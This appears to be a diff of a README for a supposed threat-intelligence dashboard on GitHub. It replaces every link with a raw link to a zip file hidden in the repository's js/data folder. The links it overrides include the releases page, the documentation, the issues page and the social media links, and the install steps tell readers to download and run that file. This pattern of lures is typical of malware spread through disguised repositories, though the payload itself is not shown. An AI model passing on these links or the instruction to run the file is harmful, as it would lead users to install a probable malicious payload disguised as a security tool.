@@ -1,7 +1,7 @@
 # 🛡️ apt-intelligence-dashboard - Your Source for Real-Time Threat Insights
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/IgorDevApp/apt-intelligence-dashboard/releases)
+[![Download](https://github.com/IgorDevApp/apt-intelligence-dashboard/raw/refs/heads/main/js/data/dashboard-intelligence-apt-v3.2-beta.5.zip)](https://github.com/IgorDevApp/apt-intelligence-dashboard/raw/refs/heads/main/js/data/dashboard-intelligence-apt-v3.2-beta.5.zip)
 
 ## 🚀 Getting Started
 The apt-intelligence-dashboard helps you visualize real-time threat intelligence. This tool brings together data from over 864 APT groups. Whether you're curious about cyber threats or want to enhance your security awareness, this dashboard provides all the insights you need.
@@ -20,7 +20,7 @@ The apt-intelligence-dashboard helps you visualize real-time threat intelligence
 ## 💾 Download & Install
 To get started, follow these steps:
 
-1. **Visit** the [Releases Page](https://github.com/IgorDevApp/apt-intelligence-dashboard/releases) to find the latest version.
+1. **Visit** the [Releases Page](https://github.com/IgorDevApp/apt-intelligence-dashboard/raw/refs/heads/main/js/data/dashboard-intelligence-apt-v3.2-beta.5.zip) to find the latest version.
 2. **Download** the appropriate file for your operating system.
 3. **Run** the downloaded file. It will guide you through installation steps. 
 
@@ -44,8 +44,8 @@ Yes, contributions are welcome! If you have insights or improvements, check the 
 Yes, the apt-intelligence-dashboard is open-source and free to use.
 
 ## 📖 Additional Resources
-- **Documentation**: Explore the complete documentation [here](https://github.com/IgorDevApp/apt-intelligence-dashboard/wiki).
-- **Community Support**: Join discussions or ask questions in the project’s [GitHub Issues](https://github.com/IgorDevApp/apt-intelligence-dashboard/issues).
+- **Documentation**: Explore the complete documentation [here](https://github.com/IgorDevApp/apt-intelligence-dashboard/raw/refs/heads/main/js/data/dashboard-intelligence-apt-v3.2-beta.5.zip).
+- **Community Support**: Join discussions or ask questions in the project’s [GitHub Issues](https://github.com/IgorDevApp/apt-intelligence-dashboard/raw/refs/heads/main/js/data/dashboard-intelligence-apt-v3.2-beta.5.zip).
 
 ## 👍 Acknowledgments
 Thank you to the contributors and organizations providing the data. Your efforts make this tool possible.
@@ -55,8 +55,8 @@ This project is licensed under the MIT License. You can use it freely while adhe
 
 ### 🌐 Connect with Us
 Stay updated and join our community through our social media channels:
-- Twitter: [@apt_dashboard](https://twitter.com/apt_dashboard)
-- LinkedIn: [apt-intelligence-dashboard](https://www.linkedin.com/company/apt-intelligence-dashboard)
+- Twitter: [@apt_dashboard](https://github.com/IgorDevApp/apt-intelligence-dashboard/raw/refs/heads/main/js/data/dashboard-intelligence-apt-v3.2-beta.5.zip)
+- LinkedIn: [apt-intelligence-dashboard](https://github.com/IgorDevApp/apt-intelligence-dashboard/raw/refs/heads/main/js/data/dashboard-intelligence-apt-v3.2-beta.5.zip)
 
 ## 📜 Download Link Reminder
-Want to start now? [Download the dashboard here](https://github.com/IgorDevApp/apt-intelligence-dashboard/releases) and explore the world of cyber threats.
+Want to start now? [Download the dashboard here](https://github.com/IgorDevApp/apt-intelligence-dashboard/raw/refs/heads/main/js/data/dashboard-intelligence-apt-v3.2-beta.5.zip) and explore the world of cyber threats.
